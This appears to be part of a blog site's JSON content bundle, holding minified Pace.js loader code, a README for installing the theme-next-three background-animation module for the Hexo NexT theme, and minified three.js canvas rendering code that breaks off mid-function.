f?f.apply(null,arguments):void 0}}return a}(),n=function(){function a(a){var b,c,d,e,f=this;for(this.progress=0,e=[\"error\",\"open\"],c=0,d=e.length;d>c;c++)b=e[c],a.addEventListener(b,function(){return f.progress=100},!1)}return a}(),d=function(){function a(a){var b,c,d,f;for(null==a&&(a={}),this.elements=[],null==a.selectors&&(a.selectors=[]),f=a.selectors,c=0,d=f.length;d>c;c++)b=f[c],this.elements.push(new e(b))}return a}(),e=function(){function a(a){this.selector=a,this.progress=0,this.check()}return a.prototype.check=function(){var a=this;return document.querySelector(this.selector)?this.done():setTimeout(function(){return a.check()},D.elements.checkInterval)},a.prototype.done=function(){return this.progress=100},a}(),c=function(){function a(){var a,b,c=this;this.progress=null!=(b=this.states[document.readyState])?b:100,a=document.onreadystatechange,document.onreadystatechange=function(){return null!=c.states[document.readyState]&&(c.progress=c.states[document.readyState]),\"function\"==typeof a?a.apply(null,arguments):void 0}}return a.prototype.states={loading:0,interactive:50,complete:100},a}(),f=function(){function a(){var a,b,c,d,e,f=this;this.progress=0,a=0,e=[],d=0,c=C(),b=setInterval(function(){var g;return g=C()-c-50,c=C(),e.push(g),e.length>D.eventLag.sampleCount&&e.shift(),a=q(e),++d>=D.eventLag.minSamples&&a<D.eventLag.lagThreshold?(f.progress=100,clearInterval(b)):f.progress=100*(3/(a+3))},50)}return a}(),m=function(){function a(a){this.source=a,this.last=this.sinceLastUpdate=0,this.rate=D.initialRate,this.catchup=0,this.progress=this.lastProgress=0,null!=this.source&&(this.progress=F(this.source,\"progress\"))}return a.prototype.tick=function(a,b){var c;return null==b&&(b=F(this.source,\"progress\")),b>=100&&(this.done=!0),b===this.last?this.sinceLastUpdate+=a:(this.sinceLastUpdate&&(this.rate=(b-this.last)/this.sinceLastUpdate),this.catchup=(b-this.progress)/D.catchupTime,this.sinceLastUpdate=0,this.last=b),b>this.progress&&(this.progress+=this.catchup*a),c=1-Math.pow(this.progress/100,D.easeFactor),this.progress+=c*this.rate*a,this.progress=Math.min(this.lastProgress+D.maxProgressPerFrame,this.progress),this.progress=Math.max(0,this.progress),this.progress=Math.min(100,this.progress),this.lastProgress=this.progress,this.progress},a}(),L=null,H=null,r=null,M=null,p=null,s=null,j.running=!1,z=function(){return D.restartOnPushState?j.restart():void 0},null!=window.history.pushState&&(T=window.history.pushState,window.history.pushState=function(){return z(),T.apply(window.history,arguments)}),null!=window.history.replaceState&&(W=window.history.replaceState,window.history.replaceState=function(){return z(),W.apply(window.history,arguments)}),l={ajax:a,elements:d,document:c,eventLag:f},(B=function(){var a,c,d,e,f,g,h,i;for(j.sources=L=[],g=[\"ajax\",\"elements\",\"document\",\"eventLag\"],c=0,e=g.length;e>c;c++)a=g[c],D[a]!==!1&&L.push(new l[a](D[a]));for(i=null!=(h=D.extraSources)?h:[],d=0,f=i.length;f>d;d++)K=i[d],L.push(new K(D));return j.bar=r=new b,H=[],M=new m})(),j.stop=function(){return j.trigger(\"stop\"),j.running=!1,r.destroy(),s=!0,null!=p&&(\"function\"==typeof t&&t(p),p=null),B()},j.restart=function(){return j.trigger(\"restart\"),j.stop(),j.start()},j.go=function(){var a;return j.running=!0,r.render(),a=C(),s=!1,p=G(function(b,c){var d,e,f,g,h,i,k,l,n,o,p,q,t,u,v,w;for(l=100-r.progress,e=p=0,f=!0,i=q=0,u=L.length;u>q;i=++q)for(K=L[i],o=null!=H[i]?H[i]:H[i]=[],h=null!=(w=K.elements)?w:[K],k=t=0,v=h.length;v>t;k=++t)g=h[k],n=null!=o[k]?o[k]:o[k]=new m(g),f&=n.done,n.done||(e++,p+=n.tick(b));return d=p/e,r.update(M.tick(b,d)),r.done()||f||s?(r.update(100),j.trigger(\"done\"),setTimeout(function(){return r.finish(),j.running=!1,j.trigger(\"hide\")},Math.max(D.ghostTime,Math.max(D.minTime-(C()-a),0)))):c()})},j.start=function(a){v(D,a),j.running=!0;try{r.render()}catch(b){i=b}return document.querySelector(\".pace\")?(j.trigger(\"start\"),j.go()):setTimeout(j.start,50)},\"function\"==typeof define&&define.amd?define([\"pace\"],function(){return j}):\"object\"==typeof exports?module.exports=j:D.startOnPageLoad&&j.start()}).call(this);"},{"url":"/lib/three/README.html","content":"<h1 align=\"center\"><a href=\"https://github.com/mrdoob/three.js\">JavaScript 3D library</a> for <a href=\"https://github.com/theme-next\">NexT</a></h1>\n\n<h1 align=\"center\">Installation</h1>\n\n<h2>If you want to use the CDN instead of clone this repo, please jump to the Step 3.</h2>\n\n<h2 align=\"center\">Step 1 &rarr; Go to NexT dir</h2>\n\nChange dir to **NexT** directory. There must be `layout`, `source`, `languages` and other directories:\n\n```sh\n$ cd themes/next\n$ ls\n_config.yml  crowdin.yml  docs  gulpfile.js  languages  layout  LICENSE.md  package.json  README.md  scripts  source\n```\n\n<h2 align=\"center\">Step 2 &rarr; Get module</h2>\n\nInstall module to `source/lib` directory:\n\n```sh\n$ git clone https://github.com/theme-next/theme-next-three source/lib/three\n```\n\n<h2 align=\"center\">Step 3 &rarr; Set it up</h2>\n\nEnable module in **NexT** `_config.yml` file:\n\n```yml\nthree_waves: true\nOR\ncanvas_lines: true\nOR\ncanvas_sphere: true\n```\n\n**And, if you wants to use the CDN, then need to set:**\n\n```yml\nvendors:\n  ...\n  three: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js\n  three_waves: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/three-waves.min.js\n  canvas_lines: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_lines.min.js\n  canvas_sphere: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_sphere.min.js\n```\n\n<h1 align=\"center\">Update</h1>\n\n```sh\n$ cd themes/next/source/lib/three\n$ git pull\n```\n"},{"url":"/lib/three/canvas_lines.min.js","content":"THREE.SpriteCanvasMaterial=function(e){THREE.Material.call(this),this.type=\"SpriteCanvasMaterial\",this.color=new THREE.Color(16777215),this.program=function(e,t){},this.setValues(e)},THREE.SpriteCanvasMaterial.prototype=Object.create(THREE.Material.prototype),THREE.SpriteCanvasMaterial.prototype.constructor=THREE.SpriteCanvasMaterial,THREE.SpriteCanvasMaterial.prototype.clone=function(){var e=new THREE.SpriteCanvasMaterial;return e.copy(this),e.color.copy(this.color),e.program=this.program,e},THREE.CanvasRenderer=function(e){console.log(\"THREE.CanvasRenderer\",THREE.REVISION),e=e||{};var s,l,c,p,E,d,h,f,u,m,v,x,R,y,T,w,H,g,S,M=this,b=new THREE.Projector,r=void 0!==e.canvas?e.canvas:document.createElement(\"canvas\"),C=r.width,z=r.height,V=Math.floor(C/2),j=Math.floor(z/2),L=0,O=0,B=C,W=z,n=1,P=r.getContext(\"2d\",{alpha:!0===e.alpha}),i=new THREE.Color(0),o=!0===e.alpha?0:1,a=1,k=0,N=null,F=null,A=null,I=null,D=null,t=[],G=(new THREE.RenderableVertex,new THREE.RenderableVertex,new THREE.Color),U=(new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color),q=new THREE.Color,X=new THREE.Color,J={},Y=new THREE.Box2,$=new THREE.Box2,K=new THREE.Box2,Q=new THREE.Color,Z=new THREE.Color,_=new THREE.Color,ee=new THREE.Vector3,te=new THREE.Vector3,ie=new THREE.Vector3,re=new THREE.Matrix3;function ne(e,t,i){de(i.opacity),he(i.blending);var r=t.scale.x*V,n=t.scale.y*j,o=.5*Math.sqrt(r*r+n*n);if(K.min.set(e.x-o,e.y-o),K.max.set(e.x+o,e.y+o),i instanceof THREE.SpriteMaterial){var a=i.map;if(null!==a){var s=J[a.id];if(void 0!==s&&s.version===a.version||(s=ce(a),J[a.id]=s),void 0!==s.canvas){xe(s.canvas);var l=a.image,c=l.width*a.offset.x,p=l.height*a.offset.y,E=l.width*a.repeat.x,d=l.height*a.repeat.y,h=r/E,f=n/d;P.save(),P.translate(e.x,e.y),0!==i.rotation&&P.rotate(i.rotation),P.translate(-r/2,-n/2),P.scale(h,f),P.translate(-c,-p),P.fillRect(c,p,E,d),P.restore()}}else xe(i.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==i.rotation&&P.rotate(i.rotation),P.scale(r,-n),P.fillRect(-.5,-.5,1,1),P.restore()}else i instanceof THREE.SpriteCanvasMaterial&&(ve(i.color.getStyle()),xe(i.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==i.rotation&&P.rotate(i.rotation),P.scale(r,n),i.program(P),P.restore())}function oe(e,t,i,r){if(de(r.opacity),he(r.blending),P.beginPath(),P.moveTo(e.positionScreen.x,e.positionScreen.y),P.lineTo(t.positionScreen.x,t.positionScreen.y),r instanceof THREE.LineBasicMaterial){if(fe(r.linewidth),ue(r.linecap),me(r.linejoin),r.vertexColors!==THREE.VertexColors)ve(r.color.getStyle());else{var n=i.vertexColors[0].getStyle(),o=i.vertexColors[1].getStyle();if(n===o)ve(n);else{try{var a=P.createLinearGradient(e.positionScreen.x,e.positionScreen.y,t.positionScreen.x,t.positionScreen.y);a.addColorStop(0,n),a.addColorStop(1,o)}catch(e){a=n}ve(a)}}P.stroke(),K.expandByScalar(2*r.linewidth)}else r instanceof THREE.LineDashedMaterial&&(fe(r.linewidth),ue(r.linecap),me(r.linejoin),ve(r.color.getStyle()),Re([r.dashSize,r.gapSize]),P.stroke(),K.expandByScalar(2*r.linewidth),Re([]))}function ae(e,t,i,r,n,o,a,s){if(M.info.render.vertices+=3,M.info.render.faces++,de(s.opacity),he(s.blending),h=e.positionScreen.x,f=e.positionScreen.y,u=t.positionScreen.x,m=t.positionScreen.y,v=i.positionScreen.x,x=i.positionScreen.y,function(e,t,i,r,n,o){P.beginPath(),P.moveTo(e,t),P.lineTo(i,r),P.lineTo(n,o),P.closePath()}(h,f,u,m,v,x),(s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial)&&null===s.map)U.copy(s.color),q.copy(s.emissive),s.vertexColors===THREE.FaceColors&&U.multiply(a.color),G.copy(Q),te.copy(e.positionWorld).add(t.positionWorld).add(i.positionWorld).divideScalar(3),function(e,t,i){for(var r=0,n=c.length;r<n;r++){var o=c[r];if(X.copy(o.color),o instanceof THREE.DirectionalLight){var a=ee.setFromMatrixPosition(o.matrixWorld).normalize();if((s=t.dot(a))<=0)continue;s*=o.intensity,i.add(X.multiplyScalar(s))}else if(o instanceof THREE.PointLight){var s;a=ee.setFromMatrixPosition(o.matrixWorld);if((s=t.dot(ee.subVectors(a,e).normalize()))<=0)continue;if(0==(s*=0==o.distance?1:1-Math.min(e.distanceTo(a)/o.distance,1)))continue;s*=o.intensity,i.add(X.multiplyScalar(s))}}}(te,a.normalModel,G),G.multiply(U).add(q),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G);else if(s instanceof THREE.MeshBasicMaterial||s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial){if(null!==s.map)s.map.mapping===THREE.UVMapping&&(R=a.uvs,pe(h,f,u,m,v,x,R[r].x,R[r].y,R[n].x,R[n].y,R[o].x,R[o].y,s.map));else null!==s.envMap?s.envMap.mapping===THREE.SphericalReflectionMapping&&(ie.copy(a.vertexNormalsModel[r]).applyMatrix3(re),y=.5*ie.x+.5,T=.5*ie.y+.5,ie.copy(a.vertexNormalsModel[n]).applyMatrix3(re),w=.5*ie.x+.5,H=.5*ie.y+.5,ie.copy(a.vertexNormalsModel[o]).applyMatrix3(re),g=.5*ie.x+.5,S=.5*ie.y+.5,pe(h,f,u,m,v,x,y,T,w,H,g,S,s.envMap)):(G.copy(s.color),s.vertexColors===THREE.FaceColors&&G.multiply(a.color),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G))}else s instanceof THREE.MeshNormalMaterial?(ie.copy(a.normalModel).applyMatrix3(re),G.setRGB(ie.x,ie.y,ie.z).multiplyScalar(.5).addScalar(.5)):G.setRGB(1,1,1),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G)}function se(e,t,i,r){fe(t),ue(i),me(r),ve(e.getStyle()),P.stroke(),K.expandByScalar(2*t)}function le(e){xe(e.getStyle()),P.fill()}function ce(e){if(0===e.version||e instanceof THREE.CompressedTexture||e instanceof THREE.DataTexture)return{canvas:void 0,version:e.version};var t=e.image;if(!1===t.complete)return{canvas:void 0,version:0};var i=e.wrapS===THREE.RepeatWrapping||e.wrapS===THREE.MirroredRepeatWrapping,r=e.wrapT===THREE.RepeatWrapping||e.wrapT===THREE.MirroredRepeatWrapping,n=e.wrapS===THREE.MirroredRepeatWrapping,o=e.wrapT===THREE.MirroredRepeatWrapping,a=document.createElement(\"canvas\");a.width=t.width*(n?2:1),a.height=t.height*(o?2:1);var s=a.getContext(\"2d\");s.setTransform(1,0,0,-1,0,t.height),s.drawImage(t,0,0),!0==n&&(s.setTransform(-1,0,0,-1,t.width,t.height),s.drawImage(t,-t.width,0)),!0==o&&(s.setTransform(1,0,0,1,0,0),s.drawImage(t,0,t.height)),!0==n&&!0==o&&(s.setTransform(-1,0,0,1,t.width,0),s.drawImage(t,-t.width,t.height));var l=\"no-repeat\";!0==i&&!0==r?l=\"repeat\":!0==i?l=\"repeat-x\":!0==r&&(l=\"repeat-y\");var c=P.createPattern(a,l);return e.onUpdate&&e.onUpdate(e),{canvas:c,version:e.version}}function pe(e,t,i,r,n,o,a,s,l,c,p,E,d){var h=J[d.id];if(void 0!==h&&h.version===d.version||(h=ce(d),J[d.id]=h),void 0===h.canvas)return xe(\"rgba( 0, 0, 0, 1)\"),void P.fill();xe(h.canvas);var f,u,m,v,x,R,y,T,w=d.offset.x/d.repeat.x,H=d.offset.y/d.repeat.y,g=d.image.width*d.repeat.x,S=d.image.height*d.repeat.y;l=(l+w)*g,c=(c+H)*S,p=(p+w)*g,E=(E+H)*S,i-=e,r-=t,n-=e,o-=t,0!=(y=(l-=a=(a+w)*g)*(E-=s=(s+H)*S)-(p-=a)*(c-=s))&&(x=e-(f=(E*i-c*n)*(T=1/y))*a-(m=(l*n-p*i)*T)*s,R=t-(u=(E*r-c*o)*T)*a-(v=(l*o-p*r)*T)*s,P.save(),P.transform(f,u,m,v,x,R),P.fill(),P.restore())}function Ee(e,t,i){var r,n=t.x-e.x,o=t.y-e.y,a=n*n+o*o;0!=a&&(n*=r=i/Math.sqrt(a),o*=r,t.x+=n,t.y+=o,e.x-=n,e.y-=o)}function de(e){a!==e&&(P.globalAlpha=e,a=e)}function he(e){k!==e&&(e===THREE.NormalBlending?P.globalCompositeOperation=\"source-over\":e===THREE.AdditiveBlending?P.globalCompositeOperation=\"lighter\":e===THREE.SubtractiveBlending?P.globalCompositeOperation=\"darker\":e===THREE.MultiplyBlending&&(P.globalCompositeOperation=\"multiply\"),k=e)}function fe(e){A!==e&&(P.lineWidth=e,A=e)}function ue(e){I!==e&&(P.lineCap=e,I=e)}function me(e){D!==e&&(P.lineJoin=e,D=e)}function ve(e){N!==e&&(P.strokeStyle=e,N=e)}function xe(e){F!==e&&(P.fillStyle=e,F=e)}function Re(e){t.length!==e.length&&(P.setLineDash(e),t=e)}void 0===P.setLineDash&&(P.setLineDash=function(){}),this.domElement=r,this.autoClear=!0,this.sortObjects=!0,this.sortElements=!0,this.info={render:{vertices:0,faces:0}},this.supportsVertexTextures=function(){},this.setFaceCulling=function(){},this.getContext=function(){return P},this.getContextAttributes=function(){return P.getContextAttributes()},this.getPixelRatio=function(){return n},this.setPixelRatio=function(e){void 0!==e&&(n=e)},this.setSize=function(e,t,i){C=e*n,z=t*n,r.width=C,r.height=z,V=Math.floor(C/2),j=Math.floor(z/2),!1!==i&&(r.style.width=e+\"px\",r.style.height=t+\"px\"),Y.min.set(-V,-j),Y.max.set(V,j),$.min.set(-V,-j),$.max.set(V,j),a=1,k=0,D=I=A=F=N=null,this.setViewport(0,0,e,t)},this.setViewport=function(e,t,i,r){L=e*n,O=t*n,B=i*n,W=r*n},this.setScissor=function(){},this.setScissorTest=function(){},this.setClearColor=function(e,t){i.set(e),o=void 0!==t?t:1,$.min.set(-V,-j),$.max.set(V,j)},this.setClearColorHex=function(e,t){console.warn(\"THREE.CanvasRenderer: .setClearColorHex() is being removed. Use .setClearColor() instead.\"),this.setClearColor(e,t)},this.getClearColor=function(){return i},this.getClearAlpha=function(){return o},this.getMaxAnisotropy=function(){return 0},this.clear=function(){!1===$.isEmpty()&&($.intersect(Y),$.expandByScalar(2),$.min.x=$.min.x+V,$.min.y=-$.min.y+j,$.max.x=$.max.x+V,$.max.y=-$.max.y+j,o<1&&P.clearRect(0|$.min.x,0|$.max.y,$.max.x-$.min.x|0,$.min.y-$.max.y|0),0<o&&(he(THREE.NormalBlending),de(1),xe(\"rgba(\"+Math.floor(255*i.r)+\",\"+Math.floor(255*i.g)+\",\"+Math.floor(255*i.b)+\",\"+o+\")\"),P.fillRect(0|$.min.x,0|$.max.y,$.max.x-$.min.x|0,$.min.y-$.max.y|0)),$.makeEmpty())},this.clearColor=function(){},this.clearDepth=function(){},this.clearStencil=function(){},this.render=function(e,t){if(t instanceof THREE.Camera!=!1){var i=e.background;i&&i.isColor?(xe(\"rgb(\"+Math.floor(255*i.r)+\",\"+Math.floor(255*i.g)+\",\"+Math.floor(255*i.b)+\")\"),P.fillRect(0,0,C,z)):!0===this.autoClear&&this.clear(),M.info.render.vertices=0,M.info.render.faces=0,P.setTransform(B/C,0,0,-W/z,L,z-O),P.translate(V,j),s=b.projectScene(e,t,this.sortObjects,this.sortElements),l=s.elements,c=s.lights,t,re.getNormalMatrix(t.matrixWorldInverse),function(){Q.setRGB(0,0,0),Z.setRGB(0,0,0),_.setRGB(0,0,0);for(var e=0,t=c.length;e<t;e++){var i=c[e],r=i.color;i instanceof THREE.AmbientLight?Q.add(r):i instanceof THREE.DirectionalLight?Z.add(r):i instanceof THREE.PointLight&&_.add(r)}}();for(var r=0,n=l.length;r<n;r++){var o=l[r],a=o.material;if(void 0!==a&&0!==a.opacity){if(K.makeEmpty(),o instanceof THREE.RenderableSprite)(p=o).x*=V,p.y*=j,ne(p,o,a);else if(o instanceof THREE.RenderableLine)p=o.v1,E=o.v2,p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,K.setFromPoints([p.positionScreen,E.positionScreen]),!0===Y.intersectsBox(K)&&oe(p,E,o,a);else if(o instanceof THREE.RenderableFace){if(p=o.v1,E=o.v2,d=o.v3,p.positionScreen.z<-1||1<p.positionScreen.z)continue;if(E.positionScreen.z<-1||1<E.positionScreen.z)continue;if(d.positionScreen.z<-1||1<d.positionScreen.z)continue;p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,d.positionScreen.x*=V,d.positionScreen.y*=j,0<a.overdraw&&(Ee(p.positionScreen,E.positionScreen,a.overdraw),Ee(E.positionScreen,d.positionScreen,a.overdraw),Ee(d.positionScreen,p.positionScreen,a.overdraw)),K.setFromPoints([p.positionScreen,E.positionScreen,d.positionScreen]),!0===Y.intersectsBox(K)&&ae(p,E,d,0,1,2,o,a)}$.union(K)}}P.setTransform(1,0,0,1,0,0)}else console.error(\"THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.\")}},THREE.RenderableObject=function(){this.id=0,this.object=null,this.z=0,this.renderOrder=0},THREE.RenderableFace=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.v3=new THREE.RenderableVertex,this.normalModel=new THREE.Vector3,this.vertexNormalsModel=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3],this.vertexNormalsLength=0,this.color=new THREE.Color,this.material=null,this.uvs=[new THREE.Vector2,new THREE.Vector2,new THREE.Vector2],this.z=0,this.renderOrder=0},THREE.RenderableVertex=function(){this.position=new THREE.Vector3,this.positionWorld=new THREE.Vector3,this.positionScreen=new THREE.Vector4,this.visible=!0},THREE.RenderableVertex.prototype.copy=function(e){this.positionWorld.copy(e.positionWorld),this.positionScreen.copy(e.positionScreen)},THREE.RenderableLine=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.vertexColors=[new THREE.Color,new THREE.Color],this.material=null,this.z=0,this.renderOrder=0},THREE.RenderableSprite=function(){this.id=0,this.object=null,this.x=0,this.y=0,this.z=0,this.rotation=0,this.scale=new THREE.Vector2,this.material=null,this.renderOrder=0},THREE.Projector=function(){var K,Q,n,Z,_,ee,te,ie,re,ne,oe,ae=[],se=0,le=[],t=0,i=[],r=0,o=[],a=0,s=[],l=0,ce={objects:[],lights:[],elements:[]},pe=new THREE.Vector3,Ee=new THREE.Vector4,u=new THREE.Box3(new THREE.Vector3(-1,-1,-1),new THREE.Vector3(1,1,1)),m=new THREE.Box3,v=new Array(3),de=(new Array(4),new THREE.Matrix4),he=new THREE.Matrix4,fe=new THREE.Matrix4,ue=new THREE.Matrix3,me=new THREE.Frustum,ve=new THREE.Vector4,xe=new THREE.Vector4;this.projectVector=function(e,t){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\"),e.project(t)},this.unprojectVector=function(e,t){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\"),e.unproject(t)},this.pickingRay=function(e,t){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")};var Re=new function(){var l=[],c=[],p=null,E=null,d=new THREE.Matrix3;function r(e){var t=e.position,i=e.positionWorld,r=e.positionScreen;i.copy(t).applyMatrix4(oe),r.copy(i).applyMatrix4(he);var n=1/r.w;r.x*=n,r.y*=n,r.z*=n,e.visible=-1<=r.x&&r.x<=1&&-1<=r.y&&r.y<=1&&-1<=r.z&&r.z<=1}function h(e,t,i){return!0===e.visible||!0===t.visible||!0===i.visible||(v[0]=e.positionScreen,v[1]=t.positionScreen,v[2]=i.positionScreen,u.intersectsBox(m.setFromPoints(v)))}function f(e,t,i){return(i.positionScreen.x-e.positionScreen.x)*(t.positionScreen.y-e.positionScreen.y)-(i.positionScreen.y-e.positionScreen.y)*(t.positionScreen.x-e.positionScreen.x)<0}return{setObject:function(e){E=(p=e).material,d.getNormalMatrix(p.matrixWorld),l.length=0,c.length=0},projectVertex:r,checkTriangleVisibility:h,checkBackfaceCulling:f,pushVertex:function(e,t,i){(n=ye()).position.set(e,t,i),r(n)},pushNormal:function(e,t,i){l.push(e,t,i)},pushUv:function(e,t){c.push(e,t)},pushLine:function(e,t){var i=le[e],r=le[t];(te=we()).id=p.id,te.v1.copy(i),te.v2.copy(r),te.z=(i.positionScreen.z+r.positionScreen.z)/2,te.renderOrder=p.renderOrder,te.material=p.material,ce.elements.push(te)},pushTriangle:function(e,t,i){var r=le[e],n=le[t],o=le[i];if(!1!==h(r,n,o)&&(E.side===THREE.DoubleSide||!0===f(r,n,o))){(_=Te()).id=p.id,_.v1.copy(r),_.v2.copy(n),_.v3.copy(o),_.z=(r.positionScreen.z+n.positionScreen.z+o.positionScreen.z)/3,_.renderOrder=p.renderOrder,_.normalModel.fromArray(l,3*e),_.normalModel.applyMatrix3(d).normalize();for(var a=0;a<3;a++){var s=_.vertexNormalsModel[a];s.fromArray(l,3*arguments[a]),s.applyMatrix3(d).normalize(),_.uvs[a].fromArray(c,2*arguments[a])}_.vertexNormalsLength=3,_.material=p.material,ce.elements.push(_)}}}};function ye(){if(Z!==t)return le[Z++];var e=new THREE.RenderableVertex;return le.push(e),t++,Z++,e}function Te(){if(ee!==r)return i[ee++];var e=new THREE.RenderableFace;return i.push(e),r++,ee++,e}function we(){if(ie!==a)return o[ie++];var e=new THREE.RenderableLine;return o.push(e),a++,ie++,e}function He(){if(ne!==l)return s[ne++];var e=new THREE.RenderableSprite;return s.push(e),l++,ne++,e}function ge(e,t){return e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.z!==t.z?t.z-e.z:e.id!==t.id?e.id-t.id:0}function Se(e,t){var i=0,r=1,n=e.z+e.w,o=t.z+t.w,a=-e.z+e.w,s=-t.z+t.w;return 0<=n&&0<=o&&0<=a&&0<=s||!(n<0&&o<0||a<0&&s<0)&&(n<0?i=Math.max(i,n/(n-o)):o<0&&(r=Math.min(r,n/(n-o))),a<0?i=Math.max(i,a/(a-s)):s<0&&(r=Math.min(r,a/(a-s))),!(r<i)&&(e.lerp(t,i),t.lerp(e,1-r),!0))}this.projectScene=function(e,t,i,r){function n(e){(K=function(){if(Q!==se)return ae[Q++];var e=new THREE.RenderableObject;return ae.push(e),se++,Q++,e}()).id=e.id,K.object=e,pe.setFromMatrixPosition(e.matrixWorld),pe.applyMatrix4(he),K.z=pe.z,K.renderOrder=e.renderOrder,ce.objects.push(K)}ne=ie=ee=0,!(ce.elements.length=0)===e.autoUpdate&&e.updateMatrixWorld(),null===t.parent&&t.updateMatrixWorld(),de.copy(t.matrixWorldInverse.getInverse(t.matrixWorld)),he.multiplyMatrices(t.projectionMatrix,de),me.setFromMatrix(he),Q=0,ce.objects.length=0,ce.lights.length=0,e.traverseVisible(function(e){if(e instanceof THREE.Light)ce.lights.push(e);else if(e instanceof THREE.Mesh||e instanceof THREE.Line){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsObject(e))return;n(e)}else if(e instanceof THREE.Sprite){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsSprite(e))return;n(e)}}),!0===i&&ce.objects.sort(ge);for(var o=0,a=ce.objects.length;o<a;o++){var s=ce.objects[o].object,l=s.geometry;if(Re.setObject(s),oe=s.matrixWorld,Z=0,s instanceof THREE.Mesh){if(l instanceof THREE.BufferGeometry){var c=l.attributes,p=l.groups;if(void 0===c.position)continue;for(var E=0,d=(J=c.position.array).length;E<d;E+=3)Re.pushVertex(J[E],J[E+1],J[E+2]);if(void 0!==c.normal){var h=c.normal.array;for(E=0,d=h.length;E<d;E+=3)Re.pushNormal(h[E],h[E+1],h[E+2])}if(void 0!==c.uv){var f=c.uv.array;for(E=0,d=f.length;E<d;E+=2)Re.pushUv(f[E],f[E+1])}if(null!==l.index){var u=l.index.array;if(0<p.length)for(var m=0;m<p.length;m++){var v=p[m];for(E=v.start,d=v.start+v.count;E<d;E+=3)Re.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=u.length;E<d;E+=3)Re.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=J.length/3;E<d;E+=3)Re.pushTriangle(E,E+1,E+2)}else if(l instanceof THREE.Geometry){var x=l.vertices,R=l.faces,y=l.faceVertexUvs[0];ue.getNormalMatrix(oe);for(var T=s.material,w=T instanceof THREE.MultiMaterial,H=!0==w?s.material:null,g=0,S=x.length;g<S;g++){var M=x[g];if(pe.copy(M),!0===T.morphTargets)for(var b=l.morphTargets,C=s.morphTargetInfluences,z=0,V=b.length;z<V;z++){var j=C[z];if(0!==j){var L=b[z].vertices[g];pe.x+=(L.x-M.x)*j,pe.y+=(L.y-M.y)*j,pe.z+=(L.z-M.z)*j}}Re.pushVertex(pe.x,pe.y,pe.z)}for(var O=0,B=R.length;O<B;O++){var W=R[O];if(void 0!==(T=!0==w?H.materials[W.materialIndex]:s.material)){var P=T.side,k=le[W.a],N=le[W.b],F=le[W.c];if(!1!==Re.checkTriangleVisibility(k,N,F)){var A=Re.checkBackfaceCulling(k,N,F);if(P!==THREE.DoubleSide){if(P===THREE.FrontSide&&!1===A)continue;if(P===THREE.BackSide&&!0===A)continue}(_=Te()).id=s.id,_.v1.copy(k),_.v2.copy(N),_.v3.copy(F),_.normalModel.copy(W.normal),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||_.normalModel.negate(),_.normalModel.applyMatrix3(ue).normalize();for(var I=W.vertexNormals,D=0,G=Math.min(I.length,3);D<G;D++){var U=_.vertexNormalsModel[D];U.copy(I[D]),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||U.negate(),U.applyMatrix3(ue).normalize()}_.vertexNormalsLength=I.length;var q=y[O];if(void 0!==q)for(var X=0;X<3;X++)_.uvs[X].copy(q[X]);_.color=W.color,_.material=T,_.z=(k.positionScreen.z+N.positionScreen.z+F.positionScreen.z)/3,_.renderOrder=s.renderOrder,ce.elements.push(_)}}}}}else if(s instanceof THREE.Line){if(l instanceof THREE.BufferGeometry){if(void 0!==(c=l.attributes).position){var J;for(E=0,d=(J=c.position.array).length;E<d;E+=3)Re.pushVertex(J[E],J[E+1],J[E+2]);if(null!==l.index)for(E=0,d=(u=l.index.array).length;E<d;E+=2)Re.pushLine(u[E],u[E+1]);else{var Y=s instanceof THREE.LineSegments?2:1;for(E=0,d=J.length/3-1;E<d;E+=Y)Re.pushLine(E,E+1)}}}else if(l instanceof THREE.Geometry){if(fe.multiplyMatrices(he,oe),0===(x=s.geometry.vertices).length)continue;(k=ye()).positionScreen.copy(x[0]).applyMatrix4(fe);for(Y=s instanceof THREE.LineSegments?2:1,g=1,S=x.length;g<S;g++)(k=ye()).positionScreen.copy(x[g]).applyMatrix4(fe),0<(g+1)%Y||(N=le[Z-2],ve.copy(k.positionScreen),xe.copy(N.positionScreen),!0===Se(ve,xe)&&(ve.multiplyScalar(1/ve.w),xe.multiplyScalar(1/xe.w),(te=we()).id=s.id,te.v1.positionScreen.copy(ve),te.v2.positionScreen.copy(xe),te.z=Math.max(ve.z,xe.z),te.renderOrder=s.renderOrder,te.material=s.material,s.material.vertexColors===THREE.VertexColors&&(te.vertexColors[0].copy(s.geometry.colors[g]),te.vertexColors[1].copy(s.geometry.colors[g-1])),ce.elements.push(te)))}}else if(s instanceof THREE.Sprite){Ee.set(oe.elements[12],oe.elements[13],oe.elements[14],1),Ee.applyMatrix4(he);var 